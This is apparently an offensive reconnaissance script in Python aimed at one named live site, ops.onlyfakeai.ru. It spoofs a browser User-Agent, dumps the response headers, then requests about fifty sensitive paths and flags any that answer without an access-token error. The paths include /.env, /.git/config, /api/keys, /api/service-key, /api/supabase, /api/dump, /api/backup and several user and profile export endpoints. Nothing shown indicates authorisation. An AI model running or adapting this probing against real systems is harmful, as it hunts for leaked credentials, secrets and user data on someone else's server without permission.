import ssl, json, urllib.request, urllib.error

BASE = "https://ops.onlyfakeai.ru"
ctx = ssl.create_default_context()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def req(method, path, body=None, extra=None):
    h = dict(UA)
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, str(e)

print("=== ops headers ===")
st, hd, body = req("GET", "/")
for k, v in hd.items():
    print(f"  {k}: {v}")
print(body[:100])

paths = [
    "/api", "/api/config", "/api/settings", "/api/env", "/api/status",
    "/api/metrics", "/metrics", "/debug", "/api/debug", "/api/logs",
    "/api/export", "/api/dump", "/api/backup", "/api/supabase",
    "/api/keys", "/api/service-key", "/api/token", "/api/admin",
    "/api/admins", "/api/users", "/api/activity", "/api/credits",
    "/api/plans", "/api/plan-activity", "/api/webhook", "/api/webhooks",
    "/api/storage", "/api/buckets", "/api/objects", "/api/files",
    "/api/auth", "/api/auth/login", "/api/auth/me", "/api/auth/session",
    "/api/auth/signup", "/api/auth/reset", "/api/auth/verify",
    "/api/jobs/export", "/api/profiles/export", "/api/analytics/export",
    "/.env", "/.git/config", "/package.json", "/server.js", "/app.js",
    "/index.js", "/src", "/node_modules", "/favicon.ico", "/sitemap.xml",
]
for p in paths:
    st, hd, body = req("GET", p)
    tag = ""
    if st == 200 and "Access token" not in body:
        tag = " <<< OPEN"
    if st not in (401, 404):
        tag += f" <<< {st}"
    print(f"{st} {p}{tag} {body[:120].replace(chr(10),' ')}")
